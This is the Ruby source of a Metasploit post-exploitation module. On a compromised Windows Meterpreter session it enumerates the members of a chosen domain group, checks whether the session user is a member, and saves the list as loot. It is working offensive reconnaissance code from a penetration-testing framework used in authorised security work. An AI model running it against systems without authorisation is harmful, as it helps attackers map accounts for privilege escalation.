##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Enumerate Domain Group',
        'Description' => %q{
          This module extracts user accounts from the specified domain group
          and stores the results in the loot. It will also verify if session
          account is in the group. Data is stored in loot in a format that
          is compatible with the token_hunter plugin. This module must be
          run on a session running as a domain user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'Stephen Haywood <haywoodsb[at]gmail.com>'
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_config_getuid
            ]
          }
        }
      )
    )
    register_options([
      OptString.new('GROUP', [true, 'Domain Group to enumerate', nil])
    ])
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    group = datastore['GROUP']

    fail_with(Failure::BadConfig, 'GROUP must be set.') if group.blank?

    domain = get_domain_name

    fail_with(Failure::Unknown, 'Could not retrieve domain name. Is the host part of a domain?') if domain.blank?

    netbios_domain_name = domain.split('.').first.upcase

    members = get_members_from_group(group, domain) || []

    fail_with(Failure::Unknown, "No members found for '#{domain}\\#{group}' group.") if members.blank?

    print_status("Found #{members.length} users in '#{domain}\\#{group}' group.")

    loot = []
    members.each do |user|
      print_status("\t#{netbios_domain_name}\\#{user}")
      loot << "#{netbios_domain_name}\\#{user}"
    end

    user_domain, user = client.sys.config.getuid.split('\\')

    if user_domain.downcase.include?(netbios_domain_name.downcase) && members.map { |u| u.downcase == user.downcase }.include?(true)
      print_good("Current session running as #{domain}\\#{user} is a member of #{domain}\\#{group}!")
    else
      print_status("Current session running as #{domain}\\#{user} is not a member of #{domain}\\#{group}")
    end

    loot_file = store_loot(
      'domain.group.members',
      'text/plain',
      session,
      loot.join("\n"),
      nil,
      group
    )

    print_good("User list stored in #{loot_file}")
  end
end
